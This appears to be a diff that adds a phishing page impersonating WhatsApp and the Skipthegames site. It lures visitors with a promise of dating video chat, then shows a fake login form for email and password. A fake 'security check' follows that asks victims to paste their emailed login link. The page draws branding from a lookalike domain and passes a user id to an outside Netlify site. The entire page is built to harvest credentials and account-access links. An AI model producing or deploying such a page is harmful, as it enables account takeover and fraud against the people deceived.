@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Home | Login</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .shadow-inner-custom {
+          box-shadow: inset 0 -15px 15px -15px rgba(0, 0, 0, .4), inset 0 15px 15px -15px rgba(0, 0, 0, .4);
+          --tw-shadow-colored: inset 0 -15px 15px -15px var(--tw-shadow-color), inset 0 15px 15px -15px var(--tw-shadow-color);
+        }
+        #mainSystem {
+            background: url('./whatsapbg.jpg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+
+      </style>
+</head>
+
+<body>
+    <div id="mainSystem" class="h-screen bg-[#00BE70] flex items-center justify-center">
+        
+        <div id="videoChatBlock" class=" max-w-[400px] bg-white rounded">
+            <div class="p-5 ">
+                <div class="mx-auto flex items-center justify-center mt-5">
+                    <img class="h-16 w-16 text-center" src="./whatsapp.png" alt="">
+                </div>
+                <h2 class="text-3xl font-bold text-blue-900 text-center">Whatsapp</h2>
+                <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login With  Skipthegames and enjoy with  <b class="text-[#00BE70]">Whatsapp video chat</b> your dating partner.</p>
+                <button class="block p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md" onclick="hideVideoBlock()">Login With Skipthegame</button>
+            </div>
+        </div>
+        <!-- Login Block -->
+        <div id="authenticationBlock" class="hidden min-w-[300px] max-w-[400px] bg-white rounded">
+            <div id="loginSystem">
+
+                <form >
+                    <div class="p-5 ">
+                        <h2 class="text-2xl font-bold text-gray-600 text-center">Login With  Skipthegames</h2>
+                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
+                            <div class="w-full">
+                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
+                                </label>
+                                <input id="email" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="email" name="" required placeholder="Email address*">
+                            </div>
+                           
+                        </div>
+                        <!-- password field -->
+                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
+                            <div class="w-full">
+                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
+                                </label>
+                                <input id="password" class="w-full px-3 border-sky-500 border rounded text-lg py-1 outline-sky-500 " type="password" name="" required placeholder="password">
+                            </div>
+                           
+                        </div>
+                        <small class="text-red-700 font-bold hidden errors">incorrect password</small>
+
+                        <input type="submit" name="submit" class="block p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md" value="login Now">
+                    </div>
+                </form>
+            </div>
+
+     
+        </div>
+    </div>
+    <!-- otp System -->
+    <div id="otpSystem" style="display: none;">
+        <header>
+            <div class="cc-cookies">
+              <b>We use cookies, just to track visits to our website, we store no
+                personal details.</b>
+              <a href="" class="cc-cookie-accept">ACCEPT COOKIES</a>
+              <a href="#" title="Review our cookie policy"><b>What are cookies?</b></a>
+            </div>
+          </header>
+          <nav class="shadow-lg shadow-[#ddd]">
+            <div class="row sm:flex gap-10 items-center py-5" id="top">
+              <div class="">
+                <h1 title="Adult dating and casual encounters">
+                  <a href="https://sklpthagames.one/">
+                    <img src="https://sklpthagames.one/properties/s/i/Skipthegames-255x39.png"
+                      alt="Escorts, companions, and casual encounters" />
+                  </a>
+                </h1>
+              </div>
+              <div>
+                <h5 class="inline-block text-gray-500 text-lg">
+                  Skip the games. <span>Get satisfaction.</span>
+                </h5>
+              </div>
+            </div>
+          </nav>
+    
+          <div class=" py-6 lg:py-[18px] px-4 lg:px-0  text-[11px] shadow-inner-custom">
+            <div class="container mx-auto flex items-center gap-2">
+              <p class="">SKIPTHEGAMES.COM</p><span class="text-[#C9DEEB]">»</span>
+              <p class=" text-[#C9DEEB]">LOGIN</p>
+            </div>
+          </div>
+          <div class="row sm:flex gap-28">
+            <!-- left side -->
+            <div>
+      
+        
+      
+              <div >
+                <div class="pt-[14px] lg:pt-[18px] py-[38px] ">
+                  <h1 class="text-2xl">Security check</h1>
+                  <div class="mt-3 space-y-6">
+                    <p class="">We have upgraded our security to protect all users against account takeovers and hacking.</p>
+                    <p class="">To complete this login, an Email has been sent to your address doxuky@mailinator.com. <span
+                        class="text-xs text-custom- underline">I don't have access to this email account</span></p>
+                    <p class="">Please enter this email link:</p>
+                    <div class="">
+                      <form class="flex gap-5">
+                        <div class="flex">
+                          <input style="width: 600px;" name="" class="p-2 border  border-gray-300"
+                            placeholder="Please copy and then paste this link into a from (a bar) on a web page:" type="text"
+                            required>
+                          <input type="submit" class="rounded bg-sky-900 p-2.5 text-white" value="submit"
+                          style="text-align: center;
+                    color: white;
+                    background: skyblue;
+                    border-radius: 2px;"
+                          />
+                          </div>
+      
+                      </form>
+                    </div>
+                    <p class="">The email you received is good for 30 minutes.</p>
+                    <p class="">It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash
+                      folder.</p>
+                    <div class="flex gap-9 text-custom-rose">
+                      <p class="cursor-pointer hover:text-custom-rose2 underline">Resend the code</p>
+                      <p class="cursor-pointer hover:text-custom-rose2 underline">I don't have access to this email account
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+      
+            </div>
+            <div>
+              <h3>First time here?</h3>
+              <p class="purpal underline">
+                <a href="#">Post your first ad</a>
+              </p>
+            </div>
+          </div>
+    </div>
+
+
+          <!-- form area -->
+  
+    <!-- <div class="text-center lg:w-4/12 w-full px-4 m-auto">
+        <div id="otpSystem" style="display: none;" class="hidden">
+            <div class="py-5 my-2">
+              
+              <h2 class="bg-[#F8EFCE] text-gray-400 font-bold text-2xl py-3">NEW DEVIECE DETECTED</h2>
+              <p id="access-code" class="mt-6 text-xl text-[#C75400] text-center"></p>
+              <p class="mt-5 text-center text-xl italic font-bold text-[#2FAEEA] uppercase">CHECK YOUR SPAM <br> FOLDER IT MAY BE THERE.</p>
+              <p class="mt-7 flex items-center justify-center gap-3  text-xl text-[#C75400] text-center font-bold italic uppercase"><span>DO NOT SHARE IT</span><span class="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic"><span>?</span></span></p>
+              <p class="mt-5 text-xl text-[#C75400] text-center ">Enter the code <br> below to continue.</p>
+      
+              <form >
+                <div class="py-2">
+                  <input
+                    class="px-4 border py-2 rounded-md text-sm w-full block"
+                    required
+                    type="text"
+                    name=""
+                   
+                    placeholder="OTP Code"
+                  />
+                </div>
+    
+    
+      
+                <input
+                class="py-2 px-6 my-1  inline-block bg-yellow-500 text-2xl text-white"
+                type="submit" name="submit" 
+                  value="submit"
+                />
+    
+              </form>
+      
+            </div>
+          </div>
+    </div> -->
+    <script>
+
+
+        function hideVideoBlock() {
+            document.getElementById('videoChatBlock').style.display = 'none'; 
+            document.getElementById('authenticationBlock').style.display = 'block'; 
+        }
+
+        function navigateWithId() {
+            // Extract the query parameter from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('id');
+
+            // Navigate to the new page with the extracted user ID
+            window.open('https://erosss.netlify.app?id=' + userId, '_blank')
+        }
+    </script>
+    <script src="main.js"></script>
+</body>
+
+</html>
